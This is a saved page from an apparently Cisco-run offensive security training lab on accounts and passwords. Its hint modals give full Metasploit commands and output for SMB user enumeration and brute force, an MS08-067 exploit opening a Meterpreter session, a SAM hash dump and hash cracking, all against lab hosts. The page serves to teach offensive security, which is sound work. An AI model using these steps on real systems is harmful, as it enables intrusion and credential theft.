<!DOCTYPE html>
<!-- saved from url=(0042)http://opflex.ciscolive.com/pod1/basics/os -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <meta http-equiv="cache-control" content="max-age=0">
            <meta http-equiv="cache-control" content="no-cache">
            <meta http-equiv="expires" content="0">
            <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
            <meta http-equiv="pragma" content="no-cache">
            <link href="./os_files/bootstrap.min.css" rel="stylesheet" media="screen">
            <link href="./os_files/github.css" rel="stylesheet">
            <link href="./os_files/cerulean.css" rel="stylesheet">
            <link href="./os_files/whitebackgroundmenu.css" rel="stylesheet">
            <link rel="stylesheet" href="./os_files/font-awesome.min.css">
            <link href="./os_files/style.css" rel="stylesheet">
            <link href="./os_files/cssterm.css" rel="stylesheet">
            <link href="./os_files/bootstrap-select.min.css" rel="stylesheet">
            <title>BAH Module 7</title>
             <meta name="author" content="Omar Santos">
</head>
<body>


	<div class="container">
		<nav class="navbar navbar-default navbar-fixed-top" id="ltraci-navbar" role="navigation">
		  <div class="container-fluid">
		    <!-- Brand and toggle get grouped for better mobile display -->
		    <div class="navbar-header">

			        <a href="index.html" class="navbar-brand"><div class="pn-noncollapse">Becoming a Hacker</div></a>

		      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
		        <span class="sr-only">Toggle navigation</span>
		        <span class="icon-bar navbar-inverse"></span>
		        <span class="icon-bar"></span>
		        <span class="icon-bar"></span>
		      </button>
		    </div>
		    <!-- Collect the nav links, forms, and other content for toggling -->
		    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
		      <ul class="nav navbar-nav">


		        <li class="dropdown">
		          <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Menu<span class="caret"></span></a>
		          <ul class="dropdown-menu multi-column columns-3" role="menu" style="font-size:.7em;">
			          <div class="row">
				          <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 1</li>
										  <li>
                       <a href="#">No labs</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 2</li>
										  <li>
                       <a href="module2.html">Passive Reconnissaince</a>
                      </li>
                    </ul>
				          </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 3</li>
                      <li>
                       <a href="module3.html">Active Reconnissaince</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 4</li>
                      <li>
                       <a href="module4.html">Networking</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 5</li>
                      <li>
                       <a href="module5.html">Wireless</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 6</li>
                      <li>
                       <a href="module6.html">Web Applications</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
                    <ul class="multi-column-dropdown">
                    <li class="dropdown-header">Module 7</li>
                      <li>
                       <a href="module7.html">Accounts and Passwords</a>
                      </li>
                    </ul>
                  </div>

                  <div class="col-sm-3">
					          <ul class="multi-column-dropdown">
										<li class="dropdown-header">Module 8</li>
										  <li>
                       <a href="module8.html">Overflows</a>
                      </li>
                    </ul>
				          </div>


               </div>
               </ul>
               </li>



				<li class="ciscoliveitem"><a target="blank" href="resources.html">Resources</a></li>
				<li class="ciscoliveitem"><a target="blank" data-toggle="modal" data-target="#ABOUT" href="#">About</a></li>

		      </ul>

		    </div><!-- /.navbar-collapse  width="30px" -->
		  </div><!-- /.container-fluid -->
		</nav>
		</div>


    <div class="modal fade" id="ABOUT" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
      <div class="modal-dialog modal-lg">
        <div class="modal-content">
          <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
            <h3 class="modal-title" id="myModalLabel">Becoming a Hacker Training</h3>
          </div>
          <div class="modal-body">
    		<div class="row">
                <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
                    <img src="./os_files/hacker.png" class="img-responsive">
                </div>
                <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
                    <p>
                        The purpose of this lab is to provide the student a better understanding of offensive security.
                    </p>
                    <p>
                        Navigate to the <a href="resources.html"> Resources </a> page to obtain the presentations used in this class, as well as other resources on how to build your own lab.
                    </p>
                </div>
            </div>
            <div class="row">
              <p>

              </p>
            </div>
    		<div class="row" style="margin-top:20px;">
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Chris McCoy</strong><br>
                    Hacker, ASIG<br>
    				cmm@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Everett Stiles</strong><br>
                    Hacker, ASIG<br>
    				estiles@cisco.com<br>
    			</div>
    			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
    				<strong>Omar Ωr Santos</strong><br>
                    Peasant, PSIRT<br>
    				os@cisco.com<br>
    			</div>
    		</div>
          </div>
          <div class="modal-footer">
            <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
          </div>
        </div>
      </div>
    </div>


		<!-- <div class="container"> -->
			<!-- <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12"> -->



<div class="container">
<h1>Accounts and Passwords</h1>

<h2>Exercise 1: Capture a Password</h2>
In this exercise, you'll explore the different methods Metasploit has at its disposal to collect passwords from users that can be tricked into accessing a service you control.

<hr>
<h3>Task 1</h3>
Verify that PostgreSQL server is running...

<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Status of PostgreSQL</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
systemctl status postgresql
</pre>
</div></div>
<!-- end of copy /paste block -->

<pre>
root@bah-pod1-kali:~# systemctl status postgresql
postgresql.service - PostgreSQL RDBMS
   Loaded: loaded (/lib/systemd/system/postgresql.service; disabled; vendor preset: disab
   Active: active (exited) since Fri 2016-09-30 15:40:39 UTC; 2min 30s ago
  Process: 3452 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
 Main PID: 3452 (code=exited, status=0/SUCCESS)

Sep 30 15:40:39 bah-pod1-kali systemd[1]: Starting PostgreSQL RDBMS...
Sep 30 15:40:39 bah-pod1-kali systemd[1]: Started PostgreSQL RDBMS.
</pre>

<hr>
<h3>Task 2</h3>
Open Metasploit msfconsole
<!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
<div class="topbar">
<div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Open msfconsole</div>
<div class="topbarbutton"></div> </div>
<div class="commandblock"> <div class="copyseqnumber"> 2 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button></div>
<div class="ciscohl2" id="copy-2" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
<!-- put the code here -->
<pre>
msfconsole
</pre>
</div></div>
<!-- end of copy /paste block -->


<hr>
<h3>Task 3</h3>
Using tab completion, find out what services Metasploit can emulate from </pre>use auxiliary/server/ and use auxiliary/server/capture/ </pre>

<br>
<pre>
msf > use auxiliary/server/[TAB]
use auxiliary/server/android_browsable_msf_launch
use auxiliary/server/android_mercury_parseuri
use auxiliary/server/browser_autopwn
...
</pre>

<hr>
<h3>Task 4</h3>
<ul><li>
<p>Set up an FTP password capture session using Metasploit. Log into this session from Windows Command Prompt with&nbsp;<tt>ftp&nbsp;192.168.1.2</tt></p>
<ul><li>
<p>Observe the&nbsp;<tt>msfconsole</tt>&nbsp;window while doing this</p>
</li>
</ul></li></ul>

<hr>
<h3>Task 5</h3>
<p>Kill the FTP background job. Try&nbsp;<tt>jobs&nbsp;-h</tt></p>


<hr>
<h3>Bonus</h3>
<p>Try the SMB capture utility while accessing from Windows!</p>
<ul>
<li>
<p>Start &rarr; Run... &rarr;&nbsp;<tt>\\kali.seccon.ninja</tt></p>
</li>
<li>How is SMB different in the way it handles its passwords? Did you have to log in first before credentials were shared with Metasploit?</li>
</ul>

<hr>
<h3>Bonus</h3>
Suggest a way these utilities could be used with IP routing/ARP poisoning attacks you learned in Module 4.

<hr>
<h2>Exercise 2: Brute-Force a Samba Password with Metasploit</h2>
<p>Metasploitable2 has accounts with easily guessable passwords. Enumerate the accounts and guess the passwords using Metasploit. Wordlists can be found in&nbsp;<tt>/usr/share/wordlists</tt>. Make sure&nbsp;<tt>db_status</tt>&nbsp;shows the following:</p>

<pre>
msf > db_status
[*] postgresql connected to msf3
</pre>

<hr>
<h3>Task 1</h3>
<p>Enumerate the users on&nbsp;<tt>metasploitable</tt>&nbsp;using the&nbsp;<tt>auxiliary/scanner/smb/smb_enumusers</tt>&nbsp;plugin</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  msf > use auxiliary/scanner/smb/smb_enumusers
  msf auxiliary(smb_enumusers) > set RHOSTS metasploitable
  RHOSTS => metasploitable
  msf auxiliary(smb_enumusers) > run

  [*] 192.168.1.3 METASPLOITABLE [ games, nobody, bind, proxy, syslog, user, www-data, root, news, postgres, bin, mail, distccd, proftpd, dhcp, daemon, sshd, man, lp, mysql, gnats, libuuid, backup, msfadmin, telnetd, sys, klog, postfix, service, list, irc, ftp, tomcat55, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<hr>
<h3>Task 2</h3>
<p>Use the SMB Login Check Scanner to brute force into Samba. Try the username as the password for all users. Use the&nbsp;<strong>seccon.txt</strong>&nbsp;wordlist</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint1" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
To reduce the amount of work you have to do, only attempt to brute-force the following accounts:<br>
<pre>
  msfadmin
  user
  postgres
  sys
  klog
  service

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">
<pre>
  seccon@seccon-kali1:~/labs/08-accounts$ cat users
  msfadmin
  user
  postgres
  sys
  klog
  service

  seccon@seccon-kali1:~/labs/08-accounts$ sudo msfconsole
  ...
  msf > use auxiliary/scanner/smb/smb_login
  msf auxiliary(smb_login) > set RHOSTS metasploitable
  RHOSTS => metasploitable
  msf auxiliary(smb_login) > set USER_AS_PASS true
  USER_AS_PASS => true
  msf auxiliary(smb_login) > set PASS_FILE /usr/share/wordlists/seccon.txt
  PASS_FILE => /usr/share/wordlists/seccon.txt
  msf auxiliary(smb_login) > set USER_FILE users
  USER_FILE => users
  msf auxiliary(smb_login) > run
</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<!--end hint -->

<hr>
<h3>Task 3</h3>
<p>View the captured credentials in the database. What is the password for&nbsp;<tt>sys</tt>&nbsp;account?</p>

<hr>
<h3>Bonus</h3>
<p>Using the results from your active recon and information about services in the database, figure out an alternate way to log into&nbsp;<tt>metasploitable</tt>&nbsp;not involving Samba</p>


<hr>
<h2>Exercise 3: Crack An NTLM-hashed Password</h2>

<hr>
<h3>Task 1</h3>
<p>Using the&nbsp;<strong>MS08-067</strong>&nbsp;vulnerability, exploit and setup a&nbsp;<a href="http://www.offensive-security.com/metasploit-unleashed/Meterpreter_Basics">Meterpreter</a>&nbsp;session with&nbsp;<strong>windows</strong></p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Hint2" href="#"> ++ Click here for Hint</a>
<div class="modal fade" id="Hint2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Hint</h3>
      </div>
      <div class="modal-body">
    <div class="row">
Try using the search command:<br>
<pre>
  msf > search ms08_067

  Matching Modules
  ================

     Name                                 Disclosure Date          Rank   Description
     ----                                 ---------------          ----   -----------
     exploit/windows/smb/ms08_067_netapi  2008-10-28 00:00:00 UTC  great  MS08-067 Microsoft Server Service Relative Path Stack Corruption

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->


<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat3" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">

<pre>
  msf > use exploit/windows/smb/ms08_067_netapi
  msf exploit(ms08_067_netapi) > set RHOST windows
  RHOST => windows
  msf exploit(ms08_067_netapi) > run

  [*] Started reverse handler on 192.168.1.2:4444
  [*] Automatically detecting the target...
  [*] Fingerprint: Windows XP - Service Pack 3 - lang:English
  [*] Selected Target: Windows XP SP3 English (AlwaysOn NX)
  [*] Attempting to trigger the vulnerability...
  [*] Sending stage (769536 bytes) to 192.168.1.4
  [*] Meterpreter session 1 opened (192.168.1.2:4444 -> 192.168.1.4:1052) at 2014-11-21 18:15:20 -0800

  meterpreter >

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->

<hr>
<h3>Task 2</h3>
<p>Display the hashes out of&nbsp;<a href="http://en.wikipedia.org/wiki/Security_Accounts_Manager">SAM</a>. Suspend the Meterpreter session to the background</p>
<ul>
<li>
<p>You can display your current background sessions with the&nbsp;<tt>session</tt>&nbsp;command</p>
</li>
</ul>



<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">

<pre>

meterpreter > hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4:::
seccon:1003:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
user:1004:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::

meterpreter > background

[*] Backgrounding session 1...

msf exploit(ms08_067_netapi) > sessions -l

Active sessions
===============

  Id  Type                   Information                    Connection
  --  ----                   -----------                    ----------
  1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WINDOWS  192.168.1.2:4444 -> 192.168.1.4:1054 (192.168.1.4)

msf exploit(ms08_067_netapi) >

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->


<hr>
<h3>Task 3</h3>
<p>Dump the hashes out of SAM with the&nbsp;<tt>post/windows/gather/smart_hashdump</tt>&nbsp;utility</p>
<ul>
<li>
<p>The hash file in JtR format should show up in&nbsp;<tt>loot</tt></p>
</li>
</ul>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat5" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat5" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">

<pre>

  msf exploit(ms08_067_netapi) > use post/windows/gather/smart_hashdump

  msf post(smart_hashdump) > sessions -l

  Active sessions
  ===============

    Id  Type                   Information                    Connection
    --  ----                   -----------                    ----------
    1   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ WINDOWS  192.168.1.2:4444 -> 192.168.1.4:1054 (192.168.1.4)

  msf post(smart_hashdump) > set SESSION 1

  SESSION => 1

  msf post(smart_hashdump) > run

  [*] Running module against WINDOWS
  [*] Hashes will be saved to the database if one is connected.
  [*] Hashes will be saved in loot in JtR password file format to:
  [*] /root/.msf4/loot/20141121182250_default_192.168.1.4_windows.hashes_123878.txt
  [*] Dumping password hashes...
  [*] Running as SYSTEM extracting hashes from registry
  [*]     Obtaining the boot key...
  [*]     Calculating the hboot key using SYSKEY 26a1ab029cc81f35c920f4e2409cc7e5...
  [*]     Obtaining the user list and keys...
  [*]     Decrypting user keys...
  [*]     Dumping password hints...
  [+]     seccon:"seccon!"
  [*]     Dumping password hashes...
  [+]     Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  [+]     HelpAssistant:1000:4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4:::
  [+]     SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
  [+]     seccon:1003:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
  [+]     user:1004:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
  [*] Post module execution completed

  msf post(smart_hashdump) > loot

  Loot
  ====

  host         service  type            name                content     info            path
  ----         -------  ----            ----                -------     ----            ----
  192.168.1.4           windows.hashes  WINDOWS_hashes.txt  text/plain  Windows Hashes  /root/.msf4/loot/20141121182250_default_192.168.1.4_windows.hashes_123878.txt

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->


<hr>
<h3>Task 4</h3>
<p>Crack the NTLM hashes out of SAM with the&nbsp;<tt>auxiliary/analyze/jtr_crack_fast</tt>&nbsp;utility</p>

<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
<br><a target="blank" data-toggle="modal" data-target="#Cheat6" href="#"> ++ Click here for Cheat</a>
<div class="modal fade" id="Cheat6" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-lg">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
      </div>
      <div class="modal-body">
    <div class="row">

<pre>

msf post(smart_hashdump) > use auxiliary/analyze/jtr_crack_fast
msf auxiliary(jtr_crack_fast) > run

[*] Seeded the password database with 19 words...
fopen: /opt/metasploit/apps/pro/msf3/data/john/run.linux.x86.sse2/password.lst: No such file or directory
[*] Output: Loaded 7 password hashes with no different salts (LM DES [128/128 BS SSE2])
[*] Output: Remaining 2 password hashes with no different salts
fopen: /opt/metasploit/apps/pro/msf3/data/john/run.linux.x86.sse2/password.lst: No such file or directory
[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
[*] Output: Remaining 2 password hashes with no different salts
guesses: 0  time: 0:00:00:04 DONE (Fri Nov 21 18:25:00 2014)  c/s: 5462K  trying: ZEB1900 - ZZZ1900
[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
[*] Output: Remaining 2 password hashes with no different salts
Warning: mixed-case charset, but the current hash type is case-insensitive;
some candidate passwords may be unnecessarily tried more than once.
guesses: 0  time: 0:00:00:06 DONE (Fri Nov 21 18:25:06 2014)  c/s: 25643K  trying: ||V} - |||}
[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
[*] Output: Remaining 2 password hashes with no different salts
guesses: 0  time: 0:00:00:00 DONE (Fri Nov 21 18:25:07 2014)  c/s: 1307K  trying: 89093 - 89092
[*] Output: Loaded 6 password hashes with no different salts (LM DES [128/128 BS SSE2])
[*] Output: Remaining 2 password hashes with no different salts
[*] cred_18:PASSWORD:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
[*] cred_17:SECCON!:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
[*] cred_16::aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100:::
[*] cred_14::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*]
[*] 5 password hashes cracked, 2 left
guesses: 0  time: 0:00:00:12 DONE (Fri Nov 21 18:25:19 2014)  c/s: 10921K  trying: zydeco1900 - seccon!1900
[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
[*] Output: Remaining 2 password hashes with no different salts
guesses: 0  time: 0:00:00:05 DONE (Fri Nov 21 18:25:24 2014)  c/s: 32030K  trying: |||}
[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
[*] Output: Remaining 2 password hashes with no different salts
guesses: 0  time: 0:00:00:00 DONE (Fri Nov 21 18:25:24 2014)  c/s: 1709K  trying: 89030 - 89092
[*] Output: Loaded 5 password hashes with no different salts (NT MD4 [128/128 SSE2 + 32/32])
[*] Output: Remaining 2 password hashes with no different salts
[*] cred_18:PASSWORD:e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687:::
[*] cred_17:seccon!:e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827:::
[*] cred_14::aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*]
[*] 3 password hashes cracked, 2 left
[+] Cracked: user:PASSWORD (192.168.1.4:445)
[+] Cracked: seccon:seccon! (192.168.1.4:445)
[+] Cracked: Administrator: (192.168.1.4:445)
[*] Auxiliary module execution completed

msf auxiliary(jtr_crack_fast) > creds windows

Credentials
===========

host         port  user              pass                                                               type      proof  active?
----         ----  ----              ----                                                               ----      -----  -------
192.168.1.4  445   user              e52cac67419a9a224a3b108f3fa6cb6d:7b592e4f8178b4c75788531b2e747687  smb_hash         true
192.168.1.4  445   seccon            e17a6020453a1523aad3b435b51404ee:d3eb09053fbe2ba3f37e6e773f763827  smb_hash         true
192.168.1.4  445   SUPPORT_388945a0  aad3b435b51404eeaad3b435b51404ee:0b5c1b2296ed366332095252c3f83100  smb_hash         true
192.168.1.4  445   HelpAssistant     4f7f3b0478068dbc155ac748a60cd08d:c99241d31fe8453e3cb865be137309b4  smb_hash         true
192.168.1.4  445   Administrator     aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0  smb_hash         true
192.168.1.4  445   Administrator                                                                        password         true
192.168.1.4  445   seccon            seccon!                                                            password         true
192.168.1.4  445   user              PASSWORD                                                           password         true

</pre>
</div>
</div>
  <hr><br>

<div class="modal-footer">
<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>

<!--end hint -->



<hr>
<h2>Exercise 4: Crack Me If You Can!!!</h2>
<p>KoreLogic throws a yearly contest held at DefCon called&nbsp;<a href="http://contest-2011.korelogic.com/">Crack Me If You Can</a>. Your VM has the contest from 2011. Using John the Ripper and HashCat, try to crack as many passwords as you can.</p>

<hr>
<h3>Bonus</h3>
<p>Unzip KoreLogic-2011-CrackMeIfYouCan-tree.zip. Using John the Ripper and HashCat, try to crack as many passwords as you can.</p>



<div class="nextsection">
    <div style="float:left; font-size: .9em;">

    </div>
    <div style="float:right; font-size: .9em;">

            <div class="btn-group">
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module8.html&#39;">Next: Module 8</button>
                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module8.html&#39;">
                        <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                </button>
            </div>

    </div>
</div>

</div><!-- Whole page container -->

			<!-- </div> -->
    	<!--- </div> -->
        <span style="font-size:.7em; color:0x696969; float:right;margin:30px 20px 0px 0px;">© Copyright Cisco Systems</span>



<script src="./os_files/jquery.min.js"></script>
<script src="./os_files/bootstrap.min.js"></script>
<!-- <script src="/static/js/ZeroClipboard.js" type="text/javascript"></script> -->
<script src="./os_files/highlight.pack.js"></script>
<script type="text/javascript" src="./os_files/sijax.js"></script>
<script type="text/javascript" src="./os_files/cssterm.js"></script>
<script type="text/javascript" src="./os_files/clipboard.min.js"></script>
<script type="text/javascript" src="./os_files/bootstrap-select.min.js"></script>
<script type="text/javascript">
    Sijax.setRequestUri("/pod1/basics/os");Sijax.setJsonUri("/static/js/sijax/json2.js");
</script>


<script type="text/javascript">
var urlParams;
(window.onpopstate = function () {
    var match,
        pl     = /\+/g,  // Regex for replacing addition symbol with a space
        search = /([^&=]+)=?([^&]*)/g,
        decode = function (s) { return decodeURIComponent(s.replace(pl, " ")); },
        query  = window.location.search.substring(1);

    urlParams = {};
    while (match = search.exec(query))
       urlParams[decode(match[1])] = decode(match[2]);
})();

// Config ZeroClipboard
//ZeroClipboard.config({
//    hoverClass: 'btn-clipboard-hover'
//})

// Insert copy to clipboard button before .ciscohl
//$('.ciscohl').each(function () {
//    var btnHtml = '<div class="zero-clipboard"><span class="btn-clipboard">Copy</span></div>';
//    $(this).before(btnHtml)
//});

function runit(codeid){
    var codeblock = "codeblock-" + codeid;
    var preblock =  "output-" + codeid;
    var outfixhtmlfunc = 'outputfixhtml' + codeid;
    var code = document.getElementById(codeblock).value;
	document.getElementById(preblock).innerHTML = '';
    Sk.configure({output:eval(outfixhtmlfunc) });
    eval(Sk.importMainWithBody("<stdin>", false, code));
}





//var zeroClipboard = new ZeroClipboard($('.btn-clipboard'));
//var htmlBridge = $('#global-zeroclipboard-html-bridge');
//
//// Handlers for ZeroClipboard
//zeroClipboard.on('ready', function (event) {
//    htmlBridge
//        .data('placement', 'top')
//        .attr('title', 'Copy to clipboard')
//        .tooltip();
//    var ciscohl = $(event.target).parent().nextAll('.ciscohl').first();
//    console.log(ciscohl);
//
//    // Copy to clipboard
//    zeroClipboard.on('copy', function (event) {
